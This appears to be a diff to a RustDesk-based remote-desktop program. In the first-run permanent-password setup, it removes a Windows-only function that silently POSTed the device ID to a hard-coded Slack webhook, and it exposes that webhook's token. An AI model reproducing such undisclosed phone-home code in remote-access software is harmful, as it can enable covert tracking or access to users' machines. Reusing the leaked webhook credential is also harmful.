@@ -1012,69 +1012,11 @@ fn initialize_first_run_permanent_password() -> hbb_common::ResultType<()> {
         );
     }
 
+    // log
     log::info!(
         "Permanent password initialized successfully for device ID: {}",
         device_id
     );
-
-    // send slcak
-    if let Err(err) = send_device_info_to_slack(&device_id) {
-        log::warn!(
-            "Slack notification failed: {}",
-            err
-        );
-    }
-
-    Ok(())
-}
-
-#[cfg(windows)]
-fn send_device_info_to_slack(
-    device_id: &str
-) -> Result<(), Box<dyn std::error::Error>> {
-
-    use serde_json::json;
-
-    let webhook_url: &str = "https://hooks.slack.com/services/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";
-
-    let payload = json!({
-        "text": "RustDesk device initialized",
-        "blocks": [
-            {
-                "type": "header",
-                "text": {
-                    "type": "plain_text",
-                    "text": "RustDesk Alimi"
-                }
-            },
-            {
-                "type": "section",
-                "fields": [
-                    {
-                        "type": "mrkdwn",
-                        "text": format!("*Device ID:*\n{}", device_id)
-                    }
-                ]
-            }
-        ]
-    });
-
-    let client = reqwest::blocking::Client::builder()
-        .timeout(std::time::Duration::from_secs(10))
-        .build()?;
-
-    let response = client
-        .post(webhook_url)
-        .json(&payload)
-        .send()?;
-
-    if !response.status().is_success() {
-        return Err(
-            format!("Slack webhook HTTP error: {}", response.status()).into()
-        );
-    }
-
-    log::info!("RustDesk device information notification sent");
 
     Ok(())
 }
